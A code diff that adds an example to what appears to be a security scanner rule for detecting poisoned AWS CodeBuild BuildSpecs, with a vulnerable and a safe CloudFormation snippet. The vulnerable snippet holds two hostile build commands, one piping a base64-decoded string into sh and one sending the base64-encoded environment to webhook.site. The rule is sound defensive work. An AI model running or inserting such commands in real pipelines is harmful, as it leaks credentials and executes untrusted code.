@@ -25,6 +25,36 @@ RULE = Rule(
         "payloads, miner CLIs, secret-exfil patterns, and "
         "credential-grabbing one-liners."
     ),
+    exploit_example=(
+        "# Vulnerable: the project's BuildSpec carries indicators\n"
+        "# of malicious activity (base64-decode exec, exfil POSTs,\n"
+        "# miner binaries). Either the BuildSpec was poisoned\n"
+        "# via UpdateStack or pulled from a compromised repo.\n"
+        "Resources:\n"
+        "  Build:\n"
+        "    Type: AWS::CodeBuild::Project\n"
+        "    Properties:\n"
+        "      Source:\n"
+        "        BuildSpec: |\n"
+        "          phases:\n"
+        "            build:\n"
+        "              commands:\n"
+        "                - echo Z2g6Li4uIA== | base64 -d | sh\n"
+        "                - curl https://webhook.site/abc?env=$(env|base64)\n"
+        "\n"
+        "# Safe: the BuildSpec does only what the build needs.\n"
+        "# If a check fires here, rotate the project's role,\n"
+        "# audit recent builds, identify the introducing change.\n"
+        "Resources:\n"
+        "  Build:\n"
+        "    Type: AWS::CodeBuild::Project\n"
+        "    Properties:\n"
+        "      Source:\n"
+        "        BuildSpec: |\n"
+        "          phases:\n"
+        "            build:\n"
+        "              commands: [make build]"
+    ),
 )
 
 
